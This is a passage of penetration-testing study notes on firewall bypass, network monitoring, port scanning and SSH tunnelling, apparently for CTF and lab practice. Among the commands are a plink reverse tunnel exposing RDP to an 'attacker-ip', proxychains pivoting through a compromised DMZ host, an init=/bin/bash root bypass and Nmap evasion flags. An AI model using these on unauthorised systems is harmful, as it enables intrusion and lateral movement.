<li>Virtual firewall bypass <ul>
<li><a href="https://0xdf.gitlab.io/2019/04/06/htb-vault.html">https://0xdf.gitlab.io/2019/04/06/htb-vault.html</a></li>
<li><code class="codehilite"><span class="n">route</span></code> check routing table and look for the firewall node (gateways)</li>
<li><code class="codehilite"><span class="n">ip</span> <span class="n">addr</span> <span class="k">add</span> <span class="mi">192</span><span class="p">.</span><span class="mi">168</span><span class="p">.</span><span class="mi">5</span><span class="p">.</span><span class="mi">3</span><span class="o">/</span><span class="mi">24</span> <span class="n">dev</span> <span class="n">ens3</span></code> add a new network interface </li>
<li><code class="codehilite"><span class="n">route</span> <span class="k">delete</span> <span class="o">-</span><span class="n">net</span> <span class="mi">192</span><span class="p">.</span><span class="mi">168</span><span class="p">.</span><span class="mi">5</span><span class="p">.</span><span class="mi">0</span> <span class="n">gw</span> <span class="mi">192</span><span class="p">.</span><span class="mi">168</span><span class="p">.</span><span class="mi">122</span><span class="p">.</span><span class="mi">5</span> <span class="n">netmask</span> <span class="mi">255</span><span class="p">.</span><span class="mi">255</span><span class="p">.</span><span class="mi">255</span><span class="p">.</span><span class="mi">0</span></code> remove rule that's doing traffic forwarding to firewall</li>
<li><code class="codehilite"><span class="nv">time</span> <span class="k">for</span> <span class="nv">i</span> <span class="nv">in</span> $<span class="ss">(</span><span class="nv">seq</span> <span class="mi">1</span> <span class="mi">254</span><span class="ss">)</span><span class="c1">; do (ping -c 1 192.168.5.${i} | grep &quot;bytes from&quot; &amp;); done</span></code> host scan</li>
<li><code class="codehilite"><span class="n">iptables</span> <span class="o">-</span><span class="n">L</span></code> to get an idea about any blocking rules</li>
</ul>
</li>
<li>Simple Protocol for Independent Computing Environments (SPICE)<ul>
<li><a href="https://en.wikipedia.org/wiki/Simple_Protocol_for_Independent_Computing_Environments">https://en.wikipedia.org/wiki/Simple_Protocol_for_Independent_Computing_Environments</a></li>
<li><a href="https://0xdf.gitlab.io/2019/04/06/htb-vault.html">https://0xdf.gitlab.io/2019/04/06/htb-vault.html</a></li>
<li><code class="codehilite"><span class="n">ps</span> <span class="o">-</span><span class="n">auxww</span> <span class="o">|</span> <span class="n">grep</span> <span class="o">-</span><span class="n">F</span> <span class="s1">&#39;spice port&#39;</span></code></li>
<li><code class="codehilite"><span class="n">apt</span> <span class="n">install</span> <span class="n">remmina</span> <span class="n">remmina</span><span class="o">-</span><span class="n">plugin</span><span class="o">-</span><span class="n">spice</span></code></li>
<li>Send <code class="codehilite"><span class="n">alt</span><span class="o">+</span><span class="n">ctrl</span><span class="o">+</span><span class="n">del</span></code> to restart </li>
<li>Send <code class="codehilite"><span class="n">e</span></code> to do to recovery mode </li>
<li>Scroll down to the line that starts with linux</li>
<li>Change <code class="codehilite"><span class="n">ro</span></code> to <code class="codehilite"><span class="n">rw</span></code>, and add <code class="codehilite"><span class="n">init</span><span class="o">=/</span><span class="n">bin</span><span class="o">/</span><span class="n">bash</span></code> to the end </li>
<li>Save &amp; reboot</li>
</ul>
</li>
</ul>
<h2 id="network-security-monitoring">Network Security Monitoring<a class="headerlink" href="#network-security-monitoring" title="Permanent link">&para;</a></h2>
<ul>
<li>Prevention eventually fails. One version of this philosophy is that security breaches are inevitable</li>
<li>Prevention mechanisms can block some malicious activity, but it’s increasingly difficult for organizations to defend themselves as adversaries adopt more sophisticated tactics. </li>
<li>NSM is threat-centric, meaning adversaries are the focus of the NSM operation. Continuous Monitoring (CM) is vulnerability-centric, focusing on configuration and software weaknesses.</li>
<li>NMS is a strategy backed by tactics that focus on visibility, not control.</li>
<li><a href="http://nsmwiki.org/">http://nsmwiki.org/</a></li>
<li>Placed outside of NAT/NPAT, so that the NSM sees actual source IP of traffic<ul>
<li>configure switch to send copies of the traffic they see to an otherwise unused switch port. Cisco calls this technique the <code class="codehilite"><span class="n">Switched</span> <span class="n">Port</span> <span class="n">Analyzer</span></code>. Juniper and Dell use the term <code class="codehilite"><span class="n">port</span> <span class="n">mirroring</span></code>. <ul>
<li>intruders could disable a SPAN port in order to hide some of their activities</li>
</ul>
</li>
<li>or use network taps that provide separate ports with copies of network traffic. (Net Optics iTap Port Aggregator)</li>
</ul>
</li>
</ul>
<ul>
<li>Network address translation (NAT)</li>
<li>Network port address translation (NPAT or PAT).<ul>
<li>Each translation device rewrites the wireless or internal source IP address to be a single IP value, and uses changing source ports to differentiate among sending computers. </li>
<li>As with NAT, each translation device maintains a table to track any changes.</li>
<li>Computers use the combination of source IP address, source port, destination IP address, destination port, and IP protocol to identify unique connections.</li>
<li>Ports are the key in the translation process, as they permit several private IP addresses to be hidden behind a single public IP address.</li>
</ul>
</li>
</ul>
<ul>
<li>Recommendations <ul>
<li>Limit command shell access to the system to only those administrators who truly need it. Analysts should log in to the sensor directly only in an emergency. Instead, they should access it through tools that allow them to issue commands or retrieve data from the sensor.</li>
<li>Administrators should never share the root account, and should never log in to sensors as the root account. If possible, access the sensor using shared keys, or use a two-factor or two-step authentication system like Google Authenticator.</li>
<li>Always administer the sensor over a secure communications channel like OpenSSH.</li>
<li>Do not centrally administer the sensor’s accounts using the same system that manages normal IT or user assets.</li>
<li>Always equip production sensors with remote-access cards.</li>
<li>Assume the sensor is responsible for defending itself. Limit the expo- sure of services on the sensor, and keep all services up-to-date.</li>
<li>Export logs from the sensor to another platform so that its status can be remotely monitored and assessed.</li>
<li>If possible, put the sensor’s management interface on a private network reserved for management only.</li>
<li>If possible, use full disk encryption to protect data on the sensor when it is shut down.</li>
<li>Create and implement a plan to keep the sensor software up-to-date. Treat the system like an appliance, but maintain it as a defensible platform.</li>
</ul>
</li>
<li>Tools <ul>
<li>Xplico (<a href="http://www.xplico.org/">http://www.xplico.org/</a>) can rebuild a web page whose content was captured in network form</li>
<li>Session Data / Transaction Data<ul>
<li>Bro (<a href="http://www.bro.org/">http://www.bro.org/</a>) can generate many types of logs based on its inspection of network traffic</li>
<li>Argus (<a href="http://www.qosient.com/argus/">http://www.qosient.com/argus/</a>) can also generate records for this traffic</li>
<li>Sguil (<a href="http://www.sguil.net/">http://www.sguil.net/</a>) can also be used to view session data<ul>
<li>SANCP tool (http://nsmwiki .org/SANCP) to collect session data and render</li>
</ul>
</li>
</ul>
</li>
<li>Statistical Data<ul>
<li>Capinfos of Wireshark</li>
</ul>
</li>
<li>Metadata<ul>
<li>RobTex (<a href="http://www.robtex.com">http://www.robtex.com</a>) offers a free resource to show routing data</li>
</ul>
</li>
<li>Alert Data<ul>
<li>Snort (http:// <a href="http://www.snort.org/">www.snort.org/</a>)</li>
<li>Suricata (<a href="http://suricata-ids.org/">http://suricata-ids.org/</a>)  </li>
<li>Consoles: Sguil or Snorby (http:// <a href="http://www.snorby.org/">www.snorby.org/</a>) - Snorby is a web-based tool, whereas Sguil is a “thick client” that users install on their desktops</li>
</ul>
</li>
</ul>
</li>
</ul>
<ul>
<li>Security Onion (SO) NSM suite<ul>
<li>Linux distro for IDS and NSM<ul>
<li>Snort</li>
<li>Suricata</li>
<li>Sguil</li>
<li>Squert: View NIDS/HIDS  alerts and HTTP logs</li>
<li>Snorby: View and annotate IDS logs</li>
<li>ELSA: Seach logs (IDS, Bro, syslog)</li>
<li>Xplico: Carve PCAP files</li>
</ul>
</li>
<li><code class="codehilite"><span class="n">sudo</span> <span class="n">service</span> <span class="n">nsm</span> <span class="n">status</span></code></li>
<li><code class="codehilite"><span class="n">curl</span> <span class="n">www</span><span class="p">.</span><span class="n">testmyids</span><span class="p">.</span><span class="n">com</span></code></li>
<li>Create separate user for each sensor (SSH)</li>
</ul>
</li>
</ul>
<p><img alt="" src="../_assets/2020-08-13-00-15-54.png" /></p>
<h2 id="port-scanning">Port Scanning<a class="headerlink" href="#port-scanning" title="Permanent link">&para;</a></h2>
<ul>
<li>FPing: <code class="codehilite"><span class="k">for</span> <span class="nv">ip</span> <span class="nv">in</span> $<span class="ss">(</span><span class="nv">seq</span> <span class="mi">1</span> <span class="mi">254</span><span class="ss">)</span><span class="c1">;do fping 10.11.1.$ip &gt;&gt; fping.txt;done;grep alive ./fping.txt</span></code></li>
<li>Nc:<ul>
<li><code class="codehilite"><span class="k">for</span> <span class="nv">ip</span> <span class="nv">in</span> $<span class="ss">(</span><span class="nv">seq</span> <span class="mi">1</span> <span class="mi">5</span><span class="ss">)</span><span class="c1">; do nc -nvv -z 192.168.1.$ip 80 &amp;&gt;&gt; /tmp/ncscan.txt done</span></code></li>
<li><code class="codehilite"><span class="n">nc</span> <span class="o">-</span><span class="n">z</span> <span class="o">-</span><span class="n">v</span> <span class="p">(</span><span class="n">TARGET</span> <span class="n">IP</span> <span class="n">ADDRESS</span><span class="p">)</span> <span class="mi">1</span><span class="o">-</span><span class="mi">1024</span> <span class="mi">2</span><span class="o">&gt;/</span><span class="n">dev</span><span class="o">/</span><span class="k">stdout</span><span class="o">|</span> <span class="n">grep</span> <span class="o">-</span><span class="n">v</span> <span class="n">refused</span></code></li>
</ul>
</li>
<li>ARP ping: <code class="codehilite"><span class="n">nmap</span> <span class="o">-</span><span class="n">sP</span> <span class="o">-</span><span class="n">PR</span> <span class="mi">10</span><span class="p">.</span><span class="mi">11</span><span class="p">.</span><span class="mi">1</span><span class="p">.</span><span class="mi">0</span><span class="o">/</span><span class="mi">24</span> <span class="o">-</span><span class="n">oG</span> <span class="n">nmap</span><span class="o">-</span><span class="n">arp</span><span class="p">.</span><span class="n">txt</span></code></li>
<li>Ping: <code class="codehilite"><span class="k">for</span> <span class="nv">ip</span> <span class="nv">in</span> $<span class="ss">(</span><span class="nv">seq</span> <span class="mi">1</span> <span class="mi">254</span><span class="ss">)</span><span class="c1">;do ping -c 1 192.168.1.$ip | grep &quot;bytes from&quot; | cut -d&quot; &quot; -f4 | cut -d&quot;:&quot; -f1 &amp; done</span></code></li>
<li>/dev/tcp: <code class="codehilite"><span class="k">for</span> <span class="nv">port</span> <span class="nv">in</span> $<span class="ss">(</span><span class="nv">seq</span> <span class="mi">1</span> <span class="mi">65530</span><span class="ss">)</span><span class="c1">; do (echo $port &gt; /dev/tcp/$target/$port &amp;&amp; printf &quot;[!] $port is open.\n&quot;) 2&gt;/dev/null done</span></code></li>
<li>Port monitor 
    <div class="codehilite"><pre><span></span>watch -n1 nc -w1 -nvz <span class="m">192</span>.168.1.23 <span class="m">123</span>
<span class="c1"># -w1: timeout 1 sec, -n: no reverse lookup, -v: verbose, -z: no IO, act as a scanner</span>
</pre></div></li>
<li>Nmap: Evade Firewall<ul>
<li><code class="codehilite"><span class="o">-</span><span class="n">sA</span></code> - TCP ACK Scan<ul>
<li>Because of the ACK packets the firewall cannot create the log</li>
<li>Firewalls treat ACK packet as the response of the SYN packet
    - Open port (few ports in the case of the firewall)<ul>
<li>Closed port (most ports are closed because of the firewall)</li>
<li>Filtered (Nmap is not sure whether the port is open or not)</li>
<li>Unfiltered (Nmap can access the port but is still confused about the open status of the port)</li>
</ul>
</li>
</ul>
</li>
<li><code class="codehilite"><span class="o">-</span><span class="n">sW</span></code> - TCP Window Scan<ul>
<li>Designed to differentiate between open and closed ports instead of showing unfiltered</li>
<li>Does not open any active session with the target computer</li>
<li>Send ACK packets and receive a single RST packet in response</li>
</ul>
</li>
<li><code class="codehilite"><span class="o">-</span><span class="n">f</span></code>, <code class="codehilite"><span class="o">-</span><span class="n">ff</span></code> - Fragment Packets</li>
<li><code class="codehilite"><span class="o">-</span><span class="n">spoof</span><span class="o">-</span><span class="n">mac</span> <span class="n">Cisco</span></code> - Spoof MAC</li>
<li><code class="codehilite"><span class="o">-</span><span class="n">scan_delay</span></code> - control the delay between each and every request</li>
<li><code class="codehilite"><span class="o">-</span><span class="k">host</span><span class="o">-</span><span class="n">timeout</span></code></li>
</ul>
</li>
<li>Types of port scans<ul>
<li>TCP Connect Scan: <code class="codehilite"><span class="n">nc</span> <span class="o">-</span><span class="n">nvv</span> <span class="o">-</span><span class="n">w</span> <span class="mi">1</span> <span class="o">-</span><span class="n">z</span> <span class="o">&lt;</span><span class="n">ip</span><span class="o">&gt;</span> <span class="o">&lt;</span><span class="n">port</span><span class="o">-</span><span class="n">range</span><span class="o">&gt;</span></code><ul>
<li>Full 3 way handshake</li>
</ul>
</li>
<li>SYN / Stealth Scan<ul>
<li>Send SYN</li>
<li>SYN-ACK means open</li>
<li>RST means closed</li>
</ul>
</li>
<li>UDP Scanning: <code class="codehilite"><span class="n">nc</span> <span class="o">-</span><span class="n">nv</span> <span class="o">-</span><span class="n">u</span> <span class="o">-</span><span class="n">z</span> <span class="o">-</span><span class="n">w</span> <span class="mi">1</span> <span class="o">&lt;</span><span class="n">ip</span><span class="o">&gt;</span> <span class="o">&lt;</span><span class="n">port</span><span class="o">-</span><span class="n">range</span><span class="o">&gt;</span></code><ul>
<li>ICMP port unreachable means closed</li>
<li>No response means open</li>
</ul>
</li>
</ul>
</li>
<li>Port Knocking: <code class="codehilite"><span class="k">for</span> <span class="nv">x</span> <span class="nv">in</span> <span class="mi">1111</span>, <span class="mi">2222</span>, <span class="mi">3333</span><span class="c1">; do nmap -Pn --host_timeout 201 --scan-delay 0.2 --max-retries 0 -p $x &lt;IP&gt;; done</span></code><ul>
<li>Look for: <code class="codehilite"><span class="n">knockd</span></code></li>
<li>Configured at: <code class="codehilite"><span class="err">​</span><span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">knockd</span><span class="p">.</span><span class="n">conf</span><span class="err">​</span></code></li>
</ul>
</li>
<li>Scanning Methods<ul>
<li>All TCP and UDP fast scan:
  <div class="codehilite"><pre><span></span>masscan -p1-65535,U:1-65535 &lt;IP&gt; --rate<span class="o">=</span><span class="m">1000</span> -e tun0 -p1-65535,U:1-65535 &gt; ports
<span class="nv">ports</span><span class="o">=</span><span class="k">$(</span>cat ports <span class="p">|</span> awk -F <span class="s2">&quot; &quot;</span> <span class="s1">&#39;{print $4}&#39;</span> <span class="p">|</span> awk -F <span class="s2">&quot;/&quot;</span> <span class="s1">&#39;{print $1}&#39;</span> <span class="p">|</span> sort -n <span class="p">|</span> tr <span class="s1">&#39;\n&#39;</span> <span class="s1">&#39;,&#39;</span> <span class="p">|</span> sed <span class="s1">&#39;s/,$//&#39;</span><span class="k">)</span>
nmap -Pn -sV -sC -sU -sT -p<span class="nv">$ports</span> &lt;IP&gt;
</pre></div></li>
<li>Quick all TCP scan using Nmap only:
  <div class="codehilite"><pre><span></span><span class="nv">ports</span><span class="o">=(</span>nmap -p- --min-rate<span class="o">=</span><span class="m">1000</span> -T4 &lt;IP&gt; <span class="p">|</span> grep ^<span class="o">[</span><span class="m">0</span>-9<span class="o">]</span> <span class="p">|</span> cut -d <span class="s1">&#39;/&#39;</span> -f <span class="m">1</span> <span class="p">|</span> tr <span class="s1">&#39;\n&#39;</span> <span class="s1">&#39;,&#39;</span> <span class="p">|</span> sed s/,$//<span class="o">)</span>
nmap -Pn -sV -sC -sU -sT -p<span class="nv">$ports</span> &lt;IP&gt;
</pre></div></li>
<li>Quick all TCP and UDP scan using Nmap only:
  <div class="codehilite"><pre><span></span><span class="nv">ports</span><span class="o">=(</span>nmap -p- --min-rate<span class="o">=</span><span class="m">1000</span> -T4 &lt;IP&gt; <span class="p">|</span> grep ^<span class="o">[</span><span class="m">0</span>-9<span class="o">]</span> <span class="p">|</span> cut -d <span class="s1">&#39;/&#39;</span> -f <span class="m">1</span> <span class="p">|</span> tr <span class="s1">&#39;\n&#39;</span> <span class="s1">&#39;,&#39;</span> <span class="p">|</span> sed s/,$//<span class="o">)</span>
nmap -Pn -sV -sC -sU -sT -p<span class="nv">$ports</span> &lt;IP&gt;
</pre></div>
  <div class="codehilite"><pre><span></span>nmap -sS -T5 -A -f -v IP
nmap -n -Pn -sV --version-all --open -sC -oA <span class="o">[</span>target<span class="o">]</span> --stats-every <span class="m">120</span>
nmap -T4 -sV -sC -Pn <span class="o">[</span>box ip<span class="o">]</span> -oA <span class="o">[</span>box_name<span class="o">]</span>_initial_scan
</pre></div></li>
</ul>
</li>
<li>Vulnerability Scanning<ul>
<li>Nmap
  <div class="codehilite"><pre><span></span>nmap -v -p <span class="m">80</span> --script http-vuln-cve2010-2861 &lt;ip&gt;
nmap -v -p <span class="m">80</span> --script all &lt;ip&gt;
nmap -v -p <span class="m">80</span> -sC &lt;ip&gt;
nmap -v -p <span class="m">80</span> --script default,safe &lt;ip&gt;
</pre></div></li>
<li>OpenVAS
  <div class="codehilite"><pre><span></span><span class="n">openvas</span><span class="o">-</span><span class="n">setup</span>
<span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">ip</span><span class="p">:</span><span class="mi">9392</span>
</pre></div></li>
</ul>
</li>
</ul>
<h2 id="port-forwarding-tunneling">Port Forwarding / Tunneling<a class="headerlink" href="#port-forwarding-tunneling" title="Permanent link">&para;</a></h2>
<div class="codehilite"><pre><span></span>Local:   ssh &lt;gateway&gt; -L &lt;<span class="nb">local</span> port to listen&gt;:&lt;remote host&gt;:&lt;remote port&gt;
Remote:  ssh &lt;gateway&gt; -R &lt;remote port to bind&gt;:&lt;<span class="nb">local</span> host&gt;:&lt;<span class="nb">local</span> port&gt;
Dynamic: ssh &lt;gateway&gt; -D &lt;port to bind&gt;

Local:   plink.exe &lt;gateway&gt; -L &lt;<span class="nb">local</span> port to listen&gt;:&lt;remote host&gt;:&lt;remote port&gt;
Remote:  plink.exe &lt;gateway&gt; -R &lt;remote port to bind&gt;:&lt;<span class="nb">local</span> host&gt;:&lt;<span class="nb">local</span> port&gt;
Dynamic: plink.exe &lt;gateway&gt; -D &lt;port to bind&gt;
</pre></div>

<h3 id="local-port-forwarding">Local Port Forwarding<a class="headerlink" href="#local-port-forwarding" title="Permanent link">&para;</a></h3>
<p><img alt="" src="../_assets/2020-05-03-10-15-54.png" /></p>
<blockquote>
<p><a href="https://unix.stackexchange.com/questions/115897/whats-ssh-port-forwarding-and-whats-the-difference-between-ssh-local-and-remot">https://unix.stackexchange.com/questions/115897/whats-ssh-port-forwarding-and-whats-the-difference-between-ssh-local-and-remot</a></p>
</blockquote>
<div class="codehilite"><pre><span></span>ssh -L &lt;local-port-to-listen&gt;:&lt;remote-host&gt;:&lt;remote-port&gt; &lt;gateway&gt;
</pre></div>

<p>Allow connections to a specific blocked server. From work login to home and use it as a gateway to access <code class="codehilite"><span class="n">banned</span><span class="o">-</span><span class="n">site</span><span class="p">.</span><span class="n">com</span><span class="p">:</span><span class="mi">80</span></code>:</p>
<div class="codehilite"><pre><span></span>ssh -L <span class="m">9001</span>:banned-site.com:80 user@home <span class="c1">#work</span>
curl http://localhost:9001 <span class="c1">#home</span>
</pre></div>

<p><img alt="" src="https://chamibuddhika.files.wordpress.com/2012/03/localportforwarding.jpg" /></p>
<div class="codehilite"><pre><span></span>ssh -L <span class="m">9001</span>:banned:22 user@home
ssh -p <span class="m">9001</span> localhost
</pre></div>

<p><img alt="" src="https://chamibuddhika.files.wordpress.com/2012/03/sshsessionforwarding.jpg" /></p>
<p>Allow remote connections to local port forwards (listening on all interfaces)</p>
<div class="codehilite"><pre><span></span>ssh -L <span class="m">9001</span>:banned:22 user@home -g
ssh -p <span class="m">9001</span> work_machine <span class="c1">#remotely</span>
</pre></div>

<p>Access a port on your server which can only be accessed from localhost and not remotely. Server acts as the gateway and binds server's port 5432 to local port 9000.</p>
<div class="codehilite"><pre><span></span>ssh -L <span class="m">9000</span>:localhost:5432 user@server
psql -h localhost -p <span class="m">9000</span>
</pre></div>

<h3 id="remote-port-forwarding">Remote Port Forwarding<a class="headerlink" href="#remote-port-forwarding" title="Permanent link">&para;</a></h3>
<p><img alt="" src="../_assets/2020-05-03-10-16-13.png" /></p>
<blockquote>
<p><a href="https://unix.stackexchange.com/questions/115897/whats-ssh-port-forwarding-and-whats-the-difference-between-ssh-local-and-remot">https://unix.stackexchange.com/questions/115897/whats-ssh-port-forwarding-and-whats-the-difference-between-ssh-local-and-remot</a></p>
</blockquote>
<p>Allow remote access to restricted network. </p>
<p>Server will bind port 9001 on <code class="codehilite"><span class="n">home</span></code> machine to listen for incoming requests which would subsequently be routed through the created SSH channel. Connecting to <code class="codehilite"><span class="n">localhost</span><span class="o">:</span><span class="mi">9001</span></code> in <code class="codehilite"><span class="n">home</span></code> will forward user to intra:22</p>
<div class="codehilite"><pre><span></span>ssh -R <span class="m">9001</span>:intra-ssh-server:22 user@home <span class="c1">#work</span>
ssh -p <span class="m">9001</span> localhost <span class="c1">#home</span>
</pre></div>

<p><img alt="" src="https://chamibuddhika.files.wordpress.com/2012/03/remoteportforwarding.jpg" /></p>
<p>Add <code class="codehilite"><span class="n">GatewayPorts</span> <span class="n">yes</span></code> to <code class="codehilite"><span class="n">sshd_config</span></code> to listening on all interfaces.</p>
<p>Allow public access to a local resource through a public server.</p>
<p><div class="codehilite"><pre><span></span>ssh -R <span class="m">9000</span>:localhost:3000 user@public_sever
</pre></div>
<div class="codehilite"><pre><span></span>sudo vim /etc/ssh/sshd_config
GatewayPorts yes
sudo service ssh restart
</pre></div></p>
<h3 id="dynamic-port-forwarding">Dynamic port forwarding<a class="headerlink" href="#dynamic-port-forwarding" title="Permanent link">&para;</a></h3>
<p>One local port for tunneling data to all remote destinations (SOCKS protocol)</p>
<p><div class="codehilite"><pre><span></span>ssh -D <span class="m">9001</span> home
</pre></div>
<div class="codehilite"><pre><span></span>ssh -fND <span class="m">9001</span> home
</pre></div>
<div class="codehilite"><pre><span></span><span class="n">echo</span> <span class="s1">&#39;socks5 127.0.0.1 9999&#39;</span> <span class="o">&gt;&gt;</span> <span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">proxychains</span><span class="p">.</span><span class="n">conf</span>
</pre></div>
<div class="codehilite"><pre><span></span><span class="n">curl</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mi">192</span><span class="p">.</span><span class="mi">168</span><span class="p">.</span><span class="mi">122</span><span class="p">.</span><span class="mi">4</span> <span class="o">&amp;&amp;</span> <span class="n">proxychains</span> <span class="n">curl</span> <span class="mi">192</span><span class="p">.</span><span class="mi">168</span><span class="p">.</span><span class="mi">122</span><span class="p">.</span><span class="mi">4</span>
</pre></div>
<img alt="" src="https://chamibuddhika.files.wordpress.com/2012/03/dynamicportforwarding.jpg" /></p>
<h3 id="quick-reference_1">Quick Reference<a class="headerlink" href="#quick-reference_1" title="Permanent link">&para;</a></h3>
<ul>
<li>Monitoring Tunnels: <code class="codehilite"><span class="n">netstat</span> <span class="o">-</span><span class="n">tunelp</span></code></li>
<li>Avoid TTL: <code class="codehilite"><span class="o">-</span><span class="n">nNT</span></code></li>
<li>Creating reverse SSH client to tunnel-out remote desktop port<ul>
<li>FROM remote non-routable machine
  <div class="codehilite"><pre><span></span>pling -l root -pw password attacker-ip -R <span class="m">3390</span>:127.0.0.1:3389  
<span class="c1"># localhost 3389 to attacker ip 3389</span>
</pre></div></li>
<li>FROM attacker's machine
  <div class="codehilite"><pre><span></span>rdesktop localhost:3390
</pre></div></li>
</ul>
</li>
<li>SSH Dynamic Port Forwarding (compromised DMZ used to scan internal IPs)<ul>
<li>Create local SOCS4 proxy: From attacker's machine (compromised DMZ)
  <div class="codehilite"><pre><span></span>ssh -D <span class="m">8080</span> root@DMZ-IP

netstat -antp <span class="p">|</span> grep <span class="m">8080</span>

/etc/proxychains.conf
socks4 <span class="m">127</span>.0.0.1 <span class="m">8080</span>
proxychains nmap -p <span class="m">3389</span> -ST -Pn non-routable-remote-ip-range --oepn

proxychains rdesktop rdp-ip-in-non-routable-range
</pre></div></li>
</ul>
</li>
<li>Ncat: <ul>
<li>Forward local 1234 to command</li>
<li><code class="codehilite"><span class="nv">sudo</span> <span class="o">/</span><span class="nv">usr</span><span class="o">/</span><span class="nv">bin</span><span class="o">/</span><span class="nv">ncat</span> <span class="o">-</span><span class="nv">l</span> <span class="mi">1234</span> <span class="o">--</span><span class="nv">sh</span><span class="o">-</span><span class="k">exec</span> <span class="s2">&quot;</span><span class="s">ncat 192.168.5.2 987 -p 53</span><span class="s2">&quot;</span></code>
<strong>Tools</strong></li>
</ul>
</li>
</ul>
<ul>
<li>rinetd<ul>
<li>When outbound only 80 / 443 use port forwarding (ip1:80 will proxy for ip2:3389)
  <div class="codehilite"><pre><span></span><span class="n">nano</span> <span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">rinetd</span><span class="p">.</span><span class="n">conf</span>
<span class="n">ip1</span> <span class="mi">80</span> <span class="n">ip2</span> <span class="mi">3389</span>
</pre></div>
  <div class="codehilite"><pre><span></span><span class="n">bindaddress</span> <span class="n">bindport</span> <span class="n">connectaddress</span> <span class="n">connectport</span>
</pre></div></li>
</ul>
</li>
<li>XFLTReaT tunnelling framework: <a href="https://github.com/earthquake/XFLTReaT">https://github.com/earthquake/XFLTReaT</a>
    <div class="codehilite"><pre><span></span><span class="nv">TCP</span>
<span class="nv">UDP</span>
<span class="nv">ICMP</span>
<span class="nv">SOCKS</span> <span class="nv">v4</span>, <span class="mi">4</span><span class="nv">a</span>, <span class="mi">5</span>
<span class="nv">HTTP</span> <span class="k">CONNECT</span>
<span class="nv">SCTP</span> <span class="ss">(</span><span class="nv">by</span> <span class="nv">Darren</span> <span class="nv">Martyn</span> @<span class="nv">info_dox</span><span class="ss">)</span>
<span class="nv">WebSocket</span>
<span class="nv">DNS</span> <span class="ss">(</span><span class="nv">A</span><span class="o">/</span><span class="nv">CNAME</span>, <span class="nv">PRIVATE</span>, <span class="nv">NULL</span><span class="ss">)</span> <span class="o">-</span> <span class="nv">Proof</span> <span class="nv">of</span> <span class="nv">Concept</span>
<span class="nv">RDP</span> <span class="ss">(</span><span class="nv">Windows</span> <span class="nv">only</span><span class="ss">)</span>
</pre></div></li>
<li><a href="https://github.com/sshuttle/sshuttle">https://github.com/sshuttle/sshuttle</a></li>
<li><a href="https://github.com/klsecservices/rpivot">https://github.com/klsecservices/rpivot</a></li>
<li><a href="https://github.com/wolfSSL/wolfssh">https://github.com/wolfSSL/wolfssh</a></li>
<li><a href="https://github.com/jpillora/chisel">https://github.com/jpillora/chisel</a></li>
</ul>
<p><strong>References</strong></p>
<ul>
<li><a href="https://unix.stackexchange.com/questions/115897/whats-ssh-port-forwarding-and-whats-the-difference-between-ssh-local-and-remot">https://unix.stackexchange.com/questions/115897/whats-ssh-port-forwarding-and-whats-the-difference-between-ssh-local-and-remot</a></li>
<li><a href="https://chamibuddhika.wordpress.com/2012/03/21/ssh-tunnelling-explained/">https://chamibuddhika.wordpress.com/2012/03/21/ssh-tunnelling-explained/</a></li>
<li><a href="http://www.debianadmin.com/howto-use-ssh-local-and-remote-port-forwarding.html">http://www.debianadmin.com/howto-use-ssh-local-and-remote-port-forwarding.html</a></li>
<li><a href="https://blog.trackets.com/2014/05/17/ssh-tunnel-local-and-remote-port-forwarding-explained-with-examples.html">https://blog.trackets.com/2014/05/17/ssh-tunnel-local-and-remote-port-forwarding-explained-with-examples.html</a></li>
</ul>
<p><strong>New References</strong></p>
<ul>
<li><a href="https://vimeo.com/54505525">https://vimeo.com/54505525</a></li>
</ul>
<h2 id="tools">Tools<a class="headerlink" href="#tools" title="Permanent link">&para;</a></h2>
<ul>
<li>Inject code and spy on wifi users: <a href="https://github.com/DanMcInerney/LANs.py">https://github.com/DanMcInerney/LANs.py</a></li>
<li>Collection of PowerShell network security scripts for system administrators: <a href="https://github.com/thom-s/netsec-ps-scripts">https://github.com/thom-s/netsec-ps-scripts</a></li>
<li><a href="https://github.com/medbenali/CyberScan">CyberScan: Network's Forensics ToolKit</a></li>
<li>Sparta: <a href="https://github.com/SECFORCE/sparta">https://github.com/SECFORCE/sparta</a></li>
<li>BetterCap - Swiss army knife for network attacks and monitoring: <a href="https://www.bettercap.org/">https://www.bettercap.org/</a><ul>
<li>Pwning WPA/WPA2 Networks With Bettercap and the PMKID Client-Less Attack: <a href="https://www.evilsocket.net/2019/02/13/Pwning-WiFi-networks-with-bettercap-and-the-PMKID-client-less-attack/#.XGRV3mo06jA.twitter">https://www.evilsocket.net/2019/02/13/Pwning-WiFi-networks-with-bettercap-and-the-PMKID-client-less-attack/#.XGRV3mo06jA.twitter</a></li>
</ul>
</li>
<li>Nmap <ul>
<li>Port Related Information: <code class="codehilite"><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="k">share</span><span class="o">/</span><span class="n">nmap</span><span class="o">/</span><span class="n">nmap</span><span class="o">-</span><span class="n">servies</span></code></li>
<li>ICMP (Ping) Sweep:
  <div class="codehilite"><pre><span></span><span class="n">nmap</span> <span class="o">-</span><span class="n">sn</span> <span class="o">&lt;</span><span class="n">pi</span><span class="o">-</span><span class="n">rage</span><span class="o">&gt;</span>
<span class="n">nmap</span> <span class="o">-</span><span class="n">sn</span> <span class="o">&lt;</span><span class="n">ip</span><span class="o">-</span><span class="n">range</span><span class="o">&gt;</span> <span class="o">-</span><span class="n">oG</span> <span class="n">filename</span> <span class="p">(</span><span class="n">grepable</span> <span class="n">format</span><span class="p">)</span>
</pre></div></li>
<li>Sweep TCP/UDP ports: <code class="codehilite"><span class="n">nmap</span> <span class="o">-</span><span class="n">p</span> <span class="mi">80</span> <span class="o">&lt;</span><span class="n">ip</span><span class="o">-</span><span class="n">range</span><span class="o">&gt;</span> <span class="o">-</span><span class="n">oG</span> <span class="n">filename</span></code> </li>
<li>Sweep full network for top ports: <code class="codehilite"><span class="n">nmap</span> <span class="o">-</span><span class="n">sT</span> <span class="o">-</span><span class="n">A</span> <span class="c1">--top-ports=20 &lt;ip-range&gt; -G filename</span></code></li>
